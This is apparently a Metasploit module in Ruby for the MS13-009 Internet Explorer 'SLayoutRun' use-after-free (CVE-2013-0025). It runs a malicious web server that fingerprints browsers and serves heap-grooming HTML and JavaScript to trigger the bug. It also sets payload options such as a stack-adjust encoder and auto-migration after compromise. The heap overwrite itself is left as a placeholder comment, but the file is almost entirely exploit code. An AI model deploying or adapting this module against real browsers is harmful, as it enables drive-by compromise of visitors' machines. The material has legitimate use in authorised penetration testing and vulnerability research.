##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info={})
		super(update_info(info,
			'Name'           => "MS13-009 Microsoft Internet Explorer SLayoutRun Use-After-Free",
			'Description'    => %q{
				This module exploits a use-after-free vulnerability in Microsoft Internet Explorer
				where a CParaElement node is released but a reference is still kept
				in CDoc. This memory is reused when a CDoc relayout is performed.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Scott Bell <scott.bell[at]security-assessment.com>' # Vulnerability discovery & Metasploit module
				],
			'References'     =>
				[
					[ 'CVE', '2013-0025' ],
					[ 'MSB', 'MS13-009' ],
					[ 'URL', 'http://security-assessment.com/files/documents/advisory/ie_slayoutrun_uaf.pdf' ]
				],
			'Payload'	  =>
				{
					'BadChars'       => "\x00",
					'Space'          => 920,
					'DisableNops'    => true,
					'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
				},
			'DefaultOptions'  =>
				{
					'InitialAutoRunScript' => 'migrate -f'
				},
			'Platform'	  => 'win',
			'Targets'	  =>
				[
					[ 'Automatic', {} ],
					[ 'IE 8 on Windows XP SP3', { 'Rop' => :msvcrt, 'Offset' => 0x5f4 } ]
				],
			'Privileged'	  => false,
			'DisclosureDate'  => "Feb 13 2013",
			'DefaultTarget'   => 0))

	end

	def get_target(agent)
		#If the user is already specified by the user, we'll just use that
		return target if target.name != 'Automatic'

		nt = agent.scan(/Windows NT (\d\.\d)/).flatten[0] || ''
		ie = agent.scan(/MSIE (\d)/).flatten[0] || ''

		ie_name = "IE #{ie}"

		case nt
		when '5.1'
			os_name = 'Windows XP SP3'
		end

		targets.each do |t|
			if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))
				print_status("Target selected as: #{t.name}")
				return t
			end
		end

		return nil
	end

=begin
Notes about the trigger:
* whiteSpace must be pre-line
* The document.body.innerHTML line is where the free occurs
* You must put a whitespace in the <p> tag in the HTML
* The object that ends up getting freed is CParaElement, which is 0x28 bytes

This is your crash point:
mshtml!CElement::Doc:
6363fcc4 8b01            mov     eax,dword ptr [ecx]
6363fcc6 8b5070          mov     edx,dword ptr [eax+70h] ds:0023:00000070=????????
6363fcc9 ffd2            call    edx
=end
	def get_exploit(my_target, cli)
		%Q|
		<!doctype html>
		<HTML>
		<head>
		<script>
		function exploit() {
			document.body.style.whiteSpace = "pre-line";
			setTimeout(function() {
				document.body.innerHTML = "A";
				// This is where you do the overwrite
			}, 100);
		}
		</script>
		</head>
		<body onload="eval(exploit());">
		<script>
		var d = new Array();  // Save all the allocation
		Math.cos();  // Enable LFH tracking
		for (i=0; i<0x16; i++) {
			d[i] = document.createElement("p");
		}
		</script>
		<p> </p>
		<script>
		Math.sin();  // Disable LFH tracking
		</script>
		</body>
		</html>
		|
	end


	def on_request_uri(cli, request)
		agent = request.headers['User-Agent']
		uri   = request.uri
		print_status("Requesting: #{uri}")

		my_target = get_target(agent)
		if my_target.nil?
			print_error("Browser not supported, sending 404: #{agent}")
			send_not_found(cli)
			return
		end

		html = get_exploit(my_target, cli)
		html = html.gsub(/^\t\t/, '')
		print_status "Sending HTML..."
		send_response(cli, html, {'Content-Type'=>'text/html'})

	end

end